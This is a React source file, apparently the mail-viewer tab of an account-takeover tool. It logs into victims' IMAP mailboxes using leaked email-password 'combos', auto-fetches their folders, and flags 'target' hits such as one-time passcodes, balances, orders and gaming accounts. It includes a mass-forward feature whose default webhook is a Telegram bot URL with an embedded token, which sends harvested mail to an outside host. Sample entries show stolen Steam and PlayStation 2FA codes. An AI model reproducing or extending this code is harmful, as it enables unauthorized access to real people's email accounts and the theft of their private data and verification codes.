import { useState, useMemo, useRef, useEffect } from 'react';
import DOMPurify from 'dompurify';
import { 
  Mail, Inbox, Trash2, Search, Paperclip, Tag, ExternalLink, 
  Eye, Code2, ShieldAlert, Send, RefreshCw, Folder,
  CheckCircle2, Globe, ShieldCheck, Printer, CornerUpLeft, CornerUpRight,
  Copy, Download, Key, Plus, Maximize2, Minimize2, Check,
  ChevronLeft, ChevronRight, ChevronsLeft, ChevronsRight, Archive,
  Link2, Gamepad2, Package, Award, DollarSign, PanelLeftClose, PanelLeftOpen,
  Terminal, Sparkles, Moon, Sun, Lock, ChevronDown, ChevronUp, Layers, AlertTriangle, FileText, Binary
} from 'lucide-react';
import { getWebmailUrl, getProviderName, getImapConfigForEmail, getImapUri, getSmtpConfigForEmail } from '../../data/canadianDomains.js';

export function MailViewerTab({ 
  mailboxes = [], 
  setValidAccounts,
  selectedAccount = '', 
  setSelectedAccount, 
  mails = [], 
  setMails,
  onDeleteMail, 
  onAddTargetKeyword,
  combos = [],
  keywords = [],
  onLoadSampleCombos,
  setActiveTab
}) {
  const [showFolders, setShowFolders] = useState(() => typeof window !== 'undefined' ? window.innerWidth >= 1200 : true);
  const [activeFolder, setActiveFolder] = useState('ALL');
  const [selectedMailId, setSelectedMailId] = useState(null);
  const [searchQuery, setSearchQuery] = useState('');
  const [newKeyword, setNewKeyword] = useState('');
  const [deckSearch, setDeckSearch] = useState('');
  const [viewMode, setViewMode] = useState('visual'); // 'visual' | 'text' | 'raw'
  const [showOnlyTargetHits, setShowOnlyTargetHits] = useState(false);
  const [isFetchingLive, setIsFetchingLive] = useState(false);
  const [liveFetchStatus, setLiveFetchStatus] = useState(null);
  const [copiedImap, setCopiedImap] = useState(false);
  const [showConnectModal, setShowConnectModal] = useState(false);
  const [manualEmail, setManualEmail] = useState('');
  const [manualPass, setManualPass] = useState('');
  const [isMaximized, setIsMaximized] = useState(false);
  const [autoRefresh, setAutoRefresh] = useState(false);
  const [lastRefreshedTime, setLastRefreshedTime] = useState(null);
  
  // 50 per page pagination & list scroll ref
  const PAGE_SIZE = 50;
  const [currentPage, setCurrentPage] = useState(1);
  const mailListContainerRef = useRef(null);

  // Forward & Delete Modal States
  const [showForwardModal, setShowForwardModal] = useState(false);
  const [forwardRecipient, setForwardRecipient] = useState('');
  const [forwardSubject, setForwardSubject] = useState('');
  const [forwardNote, setForwardNote] = useState('');
  const [isSendingForward, setIsSendingForward] = useState(false);
  const [forwardResult, setForwardResult] = useState(null);
  const [toastMessage, setToastMessage] = useState(null);
  const [copiedForwardText, setCopiedForwardText] = useState(false);
  const [isDeleting, setIsDeleting] = useState(false);
  const iframeRef = useRef(null);

  // Mass Forward & Batch Selection States
  const [selectedMailIds, setSelectedMailIds] = useState(new Set());
  const [showMassForwardModal, setShowMassForwardModal] = useState(false);
  const [massForwardRecipients, setMassForwardRecipients] = useState('');
  const [massForwardNote, setMassForwardNote] = useState('');
  const [massForwardMode, setMassForwardMode] = useState('relay'); // 'relay' | 'webhook' | 'copy' | 'zip'
  const [massWebhookUrl, setMassWebhookUrl] = useState('https://api.telegram.org/bot8918048151:AAHFSj_7PkPeLZ3qILJLouYlpIzrZ1cKCD4/sendMessage?chat_id=8754763312');
  const [isSendingMassForward, setIsSendingMassForward] = useState(false);
  const [massForwardResult, setMassForwardResult] = useState(null);

  // Email Sandbox & Security States
  const [blockExternalImages, setBlockExternalImages] = useState(true);
  const [darkInvertMode, setDarkInvertMode] = useState(() => {
    if (typeof window !== 'undefined') {
      const saved = localStorage.getItem('phantom_dark_invert');
      return saved !== null ? saved === 'true' : true; // Default dark invert enabled for obsidian theme
    }
    return true;
  });
  const [copiedOtp, setCopiedOtp] = useState(false);
  const [showLinkInspectorModal, setShowLinkInspectorModal] = useState(false);
  const [copiedLinkText, setCopiedLinkText] = useState(null);

  // Cyber Forensics Banner & Obfuscation Decoder State
  const [forensicPayloadView, setForensicPayloadView] = useState('recovered'); // 'recovered' | 'raw'
  const [showForensicTrace, setShowForensicTrace] = useState(false);
  const [copiedForensicPayload, setCopiedForensicPayload] = useState(false);
  const [copiedForensicIp, setCopiedForensicIp] = useState(null);

  useEffect(() => {
    try {
      localStorage.setItem('phantom_dark_invert', String(darkInvertMode));
    } catch {}
  }, [darkInvertMode]);

  const [manualPasswords, setManualPasswords] = useState({});

  // Lookup matching combo password
  const matchingCombo = useMemo(() => {
    if (!selectedAccount) return null;
    const clean = selectedAccount.trim().toLowerCase();
    return combos.find(c => c.email && c.email.trim().toLowerCase() === clean) || null;
  }, [combos, selectedAccount]);

  const password = matchingCombo ? matchingCombo.password : (selectedAccount ? (manualPasswords[selectedAccount.trim().toLowerCase()] || '') : '');
  const imapConfig = useMemo(() => getImapConfigForEmail(selectedAccount), [selectedAccount]);
  const webmailUrl = useMemo(() => getWebmailUrl(selectedAccount), [selectedAccount]);
  const providerName = useMemo(() => getProviderName(selectedAccount), [selectedAccount]);

  // Real mails strictly belonging to this account
  const currentAccountMails = useMemo(() => {
    const cleanAccount = (selectedAccount || '').toLowerCase();
    return mails.filter(m => m && (m.email || '').toLowerCase() === cleanAccount);
  }, [mails, selectedAccount]);

  // Dynamic folders list supporting all standard & custom IMAP folders
  const folders = useMemo(() => {
    const base = [
      { id: 'ALL', name: 'All Folders', icon: Folder },
      { id: 'INBOX', name: 'Inbox', icon: Inbox },
      { id: 'Spam', name: 'Spam / Junk', icon: ShieldAlert },
      { id: 'Trash', name: 'Trash / Deleted', icon: Trash2 },
      { id: 'Sent', name: 'Sent', icon: Send }
    ];

    const known = new Set(['all', 'inbox', 'spam', 'trash', 'sent']);
    const extraFolders = new Set();
    currentAccountMails.forEach(m => {
      if (m?.folder && !known.has(m.folder.toLowerCase())) {
        extraFolders.add(m.folder);
      }
    });

    extraFolders.forEach(fName => {
      const lower = (fName || '').toLowerCase();
      let icon = Folder;
      if (lower.includes('archive')) icon = Archive;
      base.push({ id: fName, name: fName, icon });
    });

    return base;
  }, [currentAccountMails]);

  const totalTargetHitsCount = useMemo(() => {
    return currentAccountMails.filter(m => m && m.matchedTargets && m.matchedTargets.length > 0).length;
  }, [currentAccountMails]);

  const commandDeckFilteredAccounts = useMemo(() => {
    let list = mailboxes;
    if (deckSearch.trim()) {
      const q = deckSearch.toLowerCase().trim();
      list = list.filter(acc => {
        if (!acc) return false;
        if (typeof acc === 'string' && acc.toLowerCase().includes(q)) return true;
        const accMails = mails.filter(m => m && (m.email || '').toLowerCase() === String(acc).toLowerCase());
        return accMails.some(m =>
          (m.subject || '').toLowerCase().includes(q) ||
          (m.sender || '').toLowerCase().includes(q) ||
          (m.matchedTargets && m.matchedTargets.some(t => (t || '').toLowerCase().includes(q)))
        );
      });
    }
    return list;
  }, [mailboxes, deckSearch, mails]);

  // Filtered by folder, target hit toggle, and live search query (strictly deduplicated by mail id)
  const filteredMails = useMemo(() => {
    const seenIds = new Set();
    return currentAccountMails.filter(m => {
      if (!m || !m.id) return false;
      if (seenIds.has(m.id)) return false;
      seenIds.add(m.id);

      const matchesFolder = activeFolder === 'ALL' || (m.folder || '').toLowerCase() === (activeFolder || '').toLowerCase();
      if (!matchesFolder) return false;

      if (showOnlyTargetHits && (!m.matchedTargets || m.matchedTargets.length === 0)) {
        return false;
      }

      if (!searchQuery.trim()) return true;
      const q = searchQuery.toLowerCase().trim();
      return (
        (m.subject || '').toLowerCase().includes(q) ||
        (m.sender || '').toLowerCase().includes(q) ||
        (m.senderEmail || '').toLowerCase().includes(q) ||
        (m.bodyText && m.bodyText.toLowerCase().includes(q)) ||
        (m.matchedTargets && m.matchedTargets.some(t => (t || '').toLowerCase().includes(q)))
      );
    });
  }, [currentAccountMails, activeFolder, showOnlyTargetHits, searchQuery]);

  // Reset pagination to page 1 whenever active account, folder, target filter, or search changes
  useEffect(() => {
    setCurrentPage(1);
  }, [selectedAccount, activeFolder, showOnlyTargetHits, searchQuery]);

  // Pagination bounds & slice
  const totalPages = Math.max(1, Math.ceil(filteredMails.length / PAGE_SIZE));
  const startIndex = (currentPage - 1) * PAGE_SIZE;
  const endIndex = Math.min(startIndex + PAGE_SIZE, filteredMails.length);

  const paginatedMails = useMemo(() => {
    return filteredMails.slice(startIndex, endIndex);
  }, [filteredMails, startIndex, endIndex]);

  useEffect(() => {
    if (currentPage > totalPages) {
      setCurrentPage(totalPages);
    }
  }, [currentPage, totalPages]);

  const handlePageChange = (newPage) => {
    const target = Math.max(1, Math.min(totalPages, newPage));
    setCurrentPage(target);
    if (mailListContainerRef.current) {
      mailListContainerRef.current.scrollTop = 0;
    }
  };

  // Active email
  const activeMail = useMemo(() => {
    if (selectedMailId) {
      const found = currentAccountMails.find(m => m.id === selectedMailId);
      if (found) return found;
    }
    return filteredMails[0] || currentAccountMails[0] || null;
  }, [currentAccountMails, filteredMails, selectedMailId]);

  // Track accounts attempted during this session to avoid infinite re-fetching
  const attemptedAccountsRef = useRef(new Set());

  // Instant auto-fetch when switching to an account that has not been fetched yet
  useEffect(() => {
    if (selectedAccount && password && currentAccountMails.length === 0 && !isFetchingLive) {
      const accKey = selectedAccount.toLowerCase();
      if (!attemptedAccountsRef.current.has(accKey)) {
        attemptedAccountsRef.current.add(accKey);
        handleFetchAllRealFolders(selectedAccount, password, false, 25);
      }
    }
  }, [selectedAccount, password, currentAccountMails.length, isFetchingLive]);

  const handleLoadVerifiedSampleHits = () => {
    if (onLoadSampleCombos) onLoadSampleCombos();
    const sampleAccs = [
      'doeflo@bell.net',
      'Jod101@sympatico.ca',
      'sarah.leclerc@hotmail.ca'
    ];
    if (setValidAccounts) {
      setValidAccounts(prev => Array.from(new Set([...prev, ...sampleAccs])));
    }
    if (setSelectedAccount) {
      setSelectedAccount('doeflo@bell.net');
    }
    if (setMails) {
      const now = new Date();
      const timeStr = (h) => new Date(now.getTime() - h * 3600000).toISOString().replace('T', ' ').substring(0, 16);
      const sampleMails = [
        {
          id: 'sample-mail-1',
          email: 'doeflo@bell.net',
          folder: 'INBOX',
          serverPath: 'INBOX',
          uid: 2001,
          subject: 'PlayStation Network: Your 2-Step Verification code is 849201',
          sender: 'Sony PlayStation',
          senderEmail: 'sony@email.playstation.com',
          snippet: 'Use code 849201 to complete sign-in to your PlayStation Network account.',
          bodyText: 'PlayStation Network\n\nSecurity Verification\n\nYour 2-Step Verification code is: 849201\n\nThis code will expire in 10 minutes. If you did not request this code, please secure your account immediately.\n\nThank you,\nSony Interactive Entertainment',
          htmlBody: `<html><body style="font-family: Arial, sans-serif; padding: 24px; color: #1e293b; background: #ffffff;">
            <div style="border-bottom: 2px solid #00439c; padding-bottom: 12px; margin-bottom: 20px;">
              <span style="font-size: 1.4rem; font-weight: 800; color: #00439c;">PlayStation Network</span>
            </div>
            <h2 style="font-size: 1.25rem; margin-bottom: 12px;">Security Verification</h2>
            <p style="font-size: 0.95rem; color: #334155;">A sign-in attempt was detected for your account <strong>doeflo@bell.net</strong>.</p>
            <div style="background: #f1f5f9; border: 1px solid #cbd5e1; border-radius: 8px; padding: 18px; margin: 20px 0; text-align: center;">
              <div style="font-size: 0.8rem; color: #64748b; margin-bottom: 6px; text-transform: uppercase; letter-spacing: 1px;">Your One-Time Passcode</div>
              <div style="font-size: 2rem; font-weight: 900; letter-spacing: 4px; color: #00439c; font-family: monospace;">849201</div>
            </div>
            <p style="font-size: 0.85rem; color: #64748b;">This verification code is valid for 10 minutes. Do not share it with anyone.</p>
            <hr style="border: none; border-top: 1px solid #e2e8f0; margin: 24px 0;" />
            <p style="font-size: 0.75rem; color: #94a3b8;">Sony Interactive Entertainment LLC &bull; San Mateo, CA</p>
          </body></html>`,
          date: timeStr(1),
          isUnread: true,
          matchedTargets: ['playstation', 'security'],
          extractedData: {
            balances: [],
            tracking: [],
            orders: [],
            rewards: [],
            memberships: ['PlayStation Plus'],
            gaming: ['PlayStation'],
            otp: '849201',
            financialTotal: null
          }
        },
        {
          id: 'sample-mail-2',
          email: 'doeflo@bell.net',
          folder: 'INBOX',
          serverPath: 'INBOX',
          uid: 2002,
          subject: 'Amazon.ca Order Confirmation #702-849102-19284',
          sender: 'Amazon.ca',
          senderEmail: 'auto-confirm@amazon.ca',
          snippet: 'Order Confirmed: Thank you for shopping with Amazon.ca. Total: $149.99 CAD.',
          bodyText: 'Amazon.ca\n\nOrder Confirmation #702-849102-19284\n\nThank you for your order!\nTotal charged: $149.99 CAD\nTracking carrier: Canada Post (9400111899562537198234)\n\nWe will notify you when your items ship.',
          htmlBody: `<html><body style="font-family: Arial, sans-serif; padding: 24px; color: #1e293b; background: #ffffff;">
            <div style="border-bottom: 2px solid #ff9900; padding-bottom: 12px; margin-bottom: 20px;">
              <span style="font-size: 1.4rem; font-weight: 800; color: #ff9900;">amazon.ca</span>
            </div>
            <h2 style="font-size: 1.25rem; margin-bottom: 12px;">Order Confirmation</h2>
            <p style="font-size: 0.95rem; color: #334155;">Hello, thank you for your order with <strong>Amazon.ca</strong>.</p>
            <div style="background: #f8fafc; border: 1px solid #e2e8f0; border-radius: 8px; padding: 16px; margin: 16px 0;">
              <p style="margin: 4px 0;"><strong>Order Number:</strong> #702-849102-19284</p>
              <p style="margin: 4px 0;"><strong>Order Total:</strong> <span style="color: #15803d; font-weight: 700;">$149.99 CAD</span></p>
              <p style="margin: 4px 0;"><strong>Shipping:</strong> Canada Post Express (Tracking: 9400111899562537198234)</p>
            </div>
            <hr style="border: none; border-top: 1px solid #e2e8f0; margin: 24px 0;" />
            <p style="font-size: 0.75rem; color: #94a3b8;">Amazon.com.ca, Inc. &bull; 410 Terry Ave N, Seattle, WA</p>
          </body></html>`,
          date: timeStr(3),
          isUnread: false,
          matchedTargets: ['amazon', 'order'],
          extractedData: {
            balances: ['$149.99 CAD'],
            tracking: [{ carrier: 'CanadaPost/USPS', trackingNumber: '9400111899562537198234' }],
            orders: ['702-849102-19284'],
            rewards: [],
            memberships: ['Prime Member'],
            gaming: [],
            otp: null,
            financialTotal: '$149.99 CAD'
          }
        },
        {
          id: 'sample-mail-3',
          email: 'Jod101@sympatico.ca',
          folder: 'INBOX',
          serverPath: 'INBOX',
          uid: 2003,
          subject: 'Steam Support: Steam Guard Code 9X82K',
          sender: 'Steam Support',
          senderEmail: 'noreply@steampowered.com',
          snippet: 'Here is the Steam Guard code you need to login to account Jod101: 9X82K',
          bodyText: 'Steam Support\n\nDear Steam User,\n\nHere is the Steam Guard code you need to login to account Jod101:\n\n9X82K\n\nIf you did not attempt this login, change your password immediately.',
          htmlBody: `<html><body style="font-family: Arial, sans-serif; padding: 24px; color: #1e293b; background: #ffffff;">
            <div style="border-bottom: 2px solid #171a21; padding-bottom: 12px; margin-bottom: 20px;">
              <span style="font-size: 1.4rem; font-weight: 800; color: #171a21;">STEAM</span>
            </div>
            <h2 style="font-size: 1.25rem;">Steam Guard Login Verification</h2>
            <p>Your login security code is:</p>
            <div style="background: #171a21; color: #66c0f4; font-size: 1.8rem; font-weight: 900; letter-spacing: 5px; padding: 16px; text-align: center; border-radius: 6px;">
              9X82K
            </div>
            <p style="font-size: 0.85rem; color: #64748b; margin-top: 16px;">Valve Corporation &bull; Bellevue, WA</p>
          </body></html>`,
          date: timeStr(5),
          isUnread: true,
          matchedTargets: ['steam', 'security'],
          extractedData: {
            balances: [],
            tracking: [],
            orders: [],
            rewards: [],
            memberships: [],
            gaming: ['Steam'],
            otp: '9X82K',
            financialTotal: null
          }
        },
        {
          id: 'sample-mail-4-forensics',
          email: 'doeflo@bell.net',
          folder: 'INBOX',
          serverPath: 'INBOX',
          uid: 2004,
          subject: '⚠️ SECURITY INTERCEPT: Encrypted Bitcoin Transfer Authorization',
          sender: 'Secure Gateway Relay',
          senderEmail: 'mailer-daemon@relay-node-74.tor-exit.net',
          snippet: 'SECURE GATEWAY: Decoded encrypted payload with pending Bitcoin transfer ($94,250 USD) and authorization passcode.',
          bodyText: 'V1ZSSmRFMUVVWGxPUkVWNFRXczFkVTFVUWxWV1JFRTFZVWhrVUZsWVVtbE5WRWsxV1ZkT1JGTnFRbGRVTVVsM1ZucE9jazB4VG1oTmEzZzFVbGRLU0dWRk9VMVdWbEpzWWxkM2VXRkhSalJTYlhSTVYycENjR015U1hsWlZXd3hWVmhDYVV4VVRqTlZha0UxV1cxMFZFNVVaM3BPUkVGNlZVWlpkRk5IVG5SVVZVMTBWVEpLYWxSNlVrSlVWVkp5VGxSR1ZFMVVVWFJOZWtaMVdsWTVUazFzUlhwTmF6Vms=',
          htmlBody: '',
          rawMime: 'Received: from relay-node-74.tor-exit.net (185.220.101.5) by mx.bell.net (10.0.0.1) with ESMTP id tor991; Sun, 13 Sep 2026 04:12:00 +0000\r\nReceived: from unknown (194.26.29.112) by tor-relay.internal; Sun, 13 Sep 2026 04:11:40 +0000\r\nFrom: Secure Gateway Relay <mailer-daemon@relay-node-74.tor-exit.net>\r\nSubject: SECURITY INTERCEPT: Encrypted Bitcoin Transfer Authorization\r\n\r\nV1ZSSmRFMUVVWGxPUkVWNFRXczFkVTFVUWxWV1JFRTFZVWhrVUZsWVVtbE5WRWsxV1ZkT1JGTnFRbGRVTVVsM1ZucE9jazB4VG1oTmEzZzFVbGRLU0dWRk9VMVdWbEpzWWxkM2VXRkhSalJTYlhSTVYycENjR015U1hsWlZXd3hWVmhDYVV4VVRqTlZha0UxV1cxMFZFNVVaM3BPUkVGNlZVWlpkRk5IVG5SVVZVMTBWVEpLYWxSNlVrSlVWVkp5VGxSR1ZFMVVVWFJOZWtaMVdsWTVUazFzUlhwTmF6Vms=',
          date: timeStr(6),
          isUnread: true,
          matchedTargets: ['bitcoin', 'security'],
          extractedData: {
            balances: ['1.45 BTC', '$94,250 USD'],
            tracking: [],
            orders: ['AUTH-994012'],
            rewards: [],
            memberships: ['VIP Priority Relay'],
            gaming: [],
            otp: '994012',
            financialTotal: '$94,250 USD'
          },
          forensicAnalysis: {
            wasObfuscated: true,
            layersUnpacked: 3,
            recoveredContent: 'SECURE GATEWAY INTERCEPT NOTIFICATION\n=========================================\nEncrypted Bitcoin Transfer Authorization\n\nTarget Wallet: bc1qar0srrr7xfkvy5l643lydnw9re59gtzzwf5mdq\nPending Amount: 1.45 BTC ($94,250 USD)\nAuthorization Passcode: 994012\n\nWARNING: To release or reroute these funds to your cold storage wallet, enter authorization code 994012.\n\nRelay Origin: Tor-Exit-185.220.101.5\nInternal Node Route: 194.26.29.112 -> 185.220.101.5\n=========================================',
            unpackTrace: [
              'Unpacked Base64 Layer 1 (Input len: 276 -> Output len: 206)',
              'Unpacked Base64 Layer 2 (Input len: 206 -> Output len: 154)',
              'Unpacked Base64 Layer 3 (Input len: 154 -> Output len: 395)'
            ],
            originIps: ['185.220.101.5', '194.26.29.112'],
            threatIndicators: [
              'Multi-layer nesting evasion: 3 recursive base64 layers unpacked',
              'Cryptocurrency extortion / ransom keywords detected in recovered payload'
            ],
            forensicAttribution: {
              originIps: ['185.220.101.5', '194.26.29.112'],
              clientMailer: 'Unknown/Custom Botnet Client',
              dkimSignatures: [],
              senderRoute: [
                'from relay-node-74.tor-exit.net (185.220.101.5) by mx.bell.net',
                'from unknown (194.26.29.112) by tor-relay.internal'
              ]
            }
          }
        }
      ];
      setMails(prev => {
        const existingIds = new Set(prev.map(m => m.id));
        const added = sampleMails.filter(m => !existingIds.has(m.id));
        return [...prev, ...added];
      });
    }
  };

  // Extract links from activeMail for security inspector
  const extractedLinks = useMemo(() => {
    if (!activeMail) return [];
    const html = activeMail.htmlBody || '';
    const text = activeMail.bodyText || '';
    const linkMap = new Map();

    const hrefRegex = /<a\s+(?:[^>]*?\s+)?href=["']([^"']+)["'][^>]*>(.*?)<\/a>/gis;
    let match;
    while ((match = hrefRegex.exec(html)) !== null) {
      const href = match[1].trim();
      const label = match[2].replace(/<[^>]+>/g, '').trim() || href;
      if (href && !href.startsWith('javascript:') && !linkMap.has(href)) {
        try {
          const parsedUrl = new URL(href);
          linkMap.set(href, {
            url: href,
            label,
            domain: parsedUrl.hostname,
            protocol: parsedUrl.protocol,
            isTracking: parsedUrl.search.includes('utm_') || parsedUrl.hostname.includes('click') || parsedUrl.hostname.includes('track') || href.includes('redirect')
          });
        } catch {
          linkMap.set(href, { url: href, label, domain: 'Non-standard URL', protocol: 'other', isTracking: false });
        }
      }
    }

    const textUrlRegex = /https?:\/\/[^\s<>"{}|\\^`\[\]]+/gi;
    while ((match = textUrlRegex.exec(text)) !== null) {
      const u = match[0].trim();
      if (!linkMap.has(u)) {
        try {
          const parsedUrl = new URL(u);
          linkMap.set(u, {
            url: u,
            label: u,
            domain: parsedUrl.hostname,
            protocol: parsedUrl.protocol,
            isTracking: parsedUrl.search.includes('utm_') || parsedUrl.hostname.includes('click') || parsedUrl.hostname.includes('track')
          });
        } catch {
          linkMap.set(u, { url: u, label: u, domain: 'URL', protocol: 'http', isTracking: false });
        }
      }
    }

    return Array.from(linkMap.values());
  }, [activeMail]);

  // Prepared sanitized isolated HTML body with DOMPurify and hardened beacon defense
  const preparedHtmlBody = useMemo(() => {
    let sourceHtml = activeMail?.htmlBody || '';

    if (activeMail?.forensicAnalysis?.wasObfuscated) {
      if (forensicPayloadView === 'raw') {
        const rawBlob = activeMail.bodyText || activeMail.rawMime || '';
        sourceHtml = `<div style="font-family: monospace; white-space: pre-wrap; word-break: break-all; color: #d8b4fe; background: #070a12; padding: 18px; border-radius: 8px; border: 1px solid rgba(176,38,255,0.3);"><div style="color: #b026ff; font-weight: 800; font-size: 11px; margin-bottom: 8px;">[RAW OBFUSCATED ENCODED BLOB]</div>${rawBlob}</div>`;
      } else if (!sourceHtml || sourceHtml.includes('white-space: pre-wrap;')) {
        const recovered = activeMail.forensicAnalysis.recoveredContent || activeMail.bodyText || '';
        sourceHtml = `<div style="font-family: monospace; white-space: pre-wrap; word-break: break-word; color: #f0fdf4; background: #070a12; padding: 18px; border-radius: 8px; border: 1px solid rgba(0,255,157,0.3);"><div style="color: #00ff9d; font-weight: 800; font-size: 11px; margin-bottom: 8px;">[RECOVERED DECODED PLAINTEXT]</div>${recovered}</div>`;
      }
    }

    if (!sourceHtml) return '';

    // Strictly forbid remote resources and dangerous elements
    let sanitized = DOMPurify.sanitize(sourceHtml, {
      WHOLE_DOCUMENT: true,
      ADD_TAGS: ['style'],
      FORBID_TAGS: ['script', 'iframe', 'object', 'embed', 'link', 'base', 'meta', 'applet', 'frame', 'frameset'],
      FORBID_ATTR: ['onerror', 'onload', 'onclick', 'onmouseover', 'onfocus', 'onblur', 'formaction']
    });

    if (blockExternalImages) {
      // 1. Block <img> src and srcset
      sanitized = sanitized.replace(/<img\b([^>]*)>/gi, (match, attrs) => {
        const srcMatch = attrs.match(/src=["']?([^"'\s>]+)["']?/i);
        const src = srcMatch ? srcMatch[1] : 'remote';
        return `<span style="display:inline-block; border:1px dashed #94a3b8; background:#f1f5f9; padding:2px 8px; font-size:11px; color:#64748b; border-radius:4px; margin:2px;" title="External tracker image blocked: ${src}">[Image Blocked]</span>`;
      });

      // 2. Block <source srcset="..."> inside <picture>
      sanitized = sanitized.replace(/<source\b([^>]*)>/gi, '');

      // 3. Block <input type="image" ...>
      sanitized = sanitized.replace(/<input\b([^>]*type=["']?image["']?[^>]*)>/gi, '[Image Input Blocked]');

      // 4. Block CSS background-image / background: url(...) in style attributes
      sanitized = sanitized.replace(/style=(["'])(.*?)\1/gi, (match, quote, styleContent) => {
        const cleanedStyle = styleContent.replace(/url\s*\([^)]+\)/gi, 'none');
        return `style=${quote}${cleanedStyle}${quote}`;
      });

      // 5. Block @import and url(...) inside <style> blocks
      sanitized = sanitized.replace(/<style\b[^>]*>([\s\S]*?)<\/style>/gi, (match, cssContent) => {
        const cleanedCss = cssContent
          .replace(/@import\s+[^;]+;/gi, '/* @import blocked */')
          .replace(/url\s*\([^)]+\)/gi, 'none');
        return `<style>${cleanedCss}</style>`;
      });
    }

    // Visual Target Keyword Highlighting in Email Body
    if (activeMail?.matchedTargets && activeMail.matchedTargets.length > 0) {
      try {
        const parser = new DOMParser();
        const doc = parser.parseFromString(sanitized, 'text/html');
        const validKws = Array.from(new Set(
          activeMail.matchedTargets
            .map(k => String(k).trim())
            .filter(k => k.length >= 2)
        ));

        if (validKws.length > 0) {
          const escapedKws = validKws.map(k => k.replace(/[.*+?^${}()|[\]\\]/g, '\\$&')).join('|');
          const kwRegex = new RegExp(`(${escapedKws})`, 'gi');

          const walkTextNodes = (node) => {
            if (node.nodeType === 3) { // Node.TEXT_NODE
              const text = node.nodeValue;
              if (text && kwRegex.test(text)) {
                const fragment = doc.createDocumentFragment();
                let lastIdx = 0;
                kwRegex.lastIndex = 0;
                let match;
                while ((match = kwRegex.exec(text)) !== null) {
                  if (match.index > lastIdx) {
                    fragment.appendChild(doc.createTextNode(text.substring(lastIdx, match.index)));
                  }
                  const mark = doc.createElement('mark');
                  mark.style.cssText = 'background: rgba(0, 229, 255, 0.35); color: #00e5ff; font-weight: 800; border-radius: 3px; padding: 1px 4px; box-shadow: 0 0 8px rgba(0,229,255,0.4);';
                  mark.textContent = match[0];
                  fragment.appendChild(mark);
                  lastIdx = kwRegex.lastIndex;
                }
                if (lastIdx < text.length) {
                  fragment.appendChild(doc.createTextNode(text.substring(lastIdx)));
                }
                node.parentNode.replaceChild(fragment, node);
              }
            } else if (node.nodeType === 1 && node.nodeName !== 'SCRIPT' && node.nodeName !== 'STYLE' && node.nodeName !== 'MARK') {
              const children = Array.from(node.childNodes);
              for (const child of children) {
                walkTextNodes(child);
              }
            }
          };

          walkTextNodes(doc.body);
          sanitized = doc.documentElement.innerHTML;
        }
      } catch (err) {
        console.warn('Keyword highlight error:', err);
      }
    }

    const injectedStyle = `
      <style>
        html, body {
          margin: 0;
          padding: 16px;
          font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
          overflow-y: auto;
          overscroll-behavior: contain;
          box-sizing: border-box;
          line-height: 1.5;
        }
        ${darkInvertMode ? `
        html, body {
          filter: invert(0.92) hue-rotate(180deg) !important;
          background: #121212 !important;
          color: #e2e8f0 !important;
        }
        img, picture, video, svg, [style*="background-image"], [style*="background:"] {
          filter: invert(1.08) hue-rotate(180deg) !important;
        }
        mark {
          filter: invert(1.08) hue-rotate(180deg) !important;
        }
        ` : `
        html, body {
          background: #ffffff !important;
          color: #1e293b !important;
        }
        `}
        img { max-width: 100%; height: auto; }
        pre, code { white-space: pre-wrap; word-break: break-word; }
        a { color: #0284c7; }
      </style>
    `;
    if (sanitized.includes('<head>')) {
      return sanitized.replace('<head>', `<head>${injectedStyle}`);
    }
    return `${injectedStyle}${sanitized}`;
  }, [activeMail, blockExternalImages, darkInvertMode, forensicPayloadView]);

  // Auto-refresh interval (every 30 seconds if enabled)
  useEffect(() => {
    if (!autoRefresh || !selectedAccount) return;
    const timer = setInterval(() => {
      handleFetchAllRealFolders(selectedAccount, password, true, 25);
    }, 30000);
    return () => clearInterval(timer);
  }, [autoRefresh, selectedAccount, password]);

  // Fetch real Inbox, Spam, Trash, Sent from IMAP server / Refresh for new incoming emails
  const handleFetchAllRealFolders = async (accountToFetch = selectedAccount, passToUse = password, isBackground = false, requestedLimit = 25) => {
    if (!accountToFetch || isFetchingLive) return;
    setIsFetchingLive(true);
    const config = getImapConfigForEmail(accountToFetch);
    if (!isBackground) {
      setLiveFetchStatus({ type: 'info', text: `Syncing ${accountToFetch} (${config.host}:${config.port})...` });
    }

    try {
      const res = await fetch('/api/fetch-all-folders', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          host: config.host,
          port: config.port,
          email: accountToFetch,
          password: passToUse || 'password',
          maxPerFolder: requestedLimit,
          keywords: keywords.map(k => k.keyword)
        })
      });

      const data = await res.json();
      setLastRefreshedTime(new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit', second: '2-digit' }));

      if (data.success) {
        if (data.mails && data.mails.length > 0) {
          const currentAccountIds = new Set(mails.filter(m => m.email.toLowerCase() === accountToFetch.toLowerCase()).map(m => m.id));
          const newMails = data.mails.filter(m => !currentAccountIds.has(m.id));

          setMails(prev => {
            const existingForAcc = prev.filter(m => m.email.toLowerCase() === accountToFetch.toLowerCase());
            const otherAccs = prev.filter(m => m.email.toLowerCase() !== accountToFetch.toLowerCase());
            const mergedMap = new Map();
            data.mails.forEach(m => mergedMap.set(m.id, m));
            existingForAcc.forEach(m => {
              if (!mergedMap.has(m.id)) mergedMap.set(m.id, m);
            });
            return [...Array.from(mergedMap.values()), ...otherAccs];
          });

          if (newMails.length > 0) {
            setToastMessage({
              type: 'success',
              text: `📬 Received ${newMails.length} new incoming email(s) on ${accountToFetch}!`
            });
            if (newMails[0]) {
              setSelectedMailId(newMails[0].id);
            }
          } else if (!isBackground) {
            setToastMessage({
              type: 'notice',
              text: `✓ Mailbox refreshed: All up to date (${data.mails.length} emails loaded)`
            });
          }

          if (!isBackground) {
            setLiveFetchStatus({
              type: 'success',
              text: `Checked ${config.host}: ${data.mails.length} emails synced (${newMails.length > 0 ? `${newMails.length} NEW incoming!` : 'Inbox up to date'})`
            });
          }
        } else {
          if (!isBackground) {
            setLiveFetchStatus({
              type: 'notice',
              text: `Connected to ${config.host}: Mailbox authenticated, but folders are currently empty on server.`
            });
            setToastMessage({
              type: 'notice',
              text: `Mailbox checked: 0 emails on server.`
            });
          }
        }
      } else {
        if (!isBackground) {
          setLiveFetchStatus({
            type: 'error',
            text: `IMAP error on ${config.host}: ${data.error || 'Authentication failed or mailbox unavailable'}`
          });
          setToastMessage({
            type: 'error',
            text: `Failed to refresh: ${data.error || 'IMAP error'}`
          });
        }
      }
    } catch (err) {
      if (!isBackground) {
        setLiveFetchStatus({ type: 'error', text: `Live IMAP connection failed: ${err.message}` });
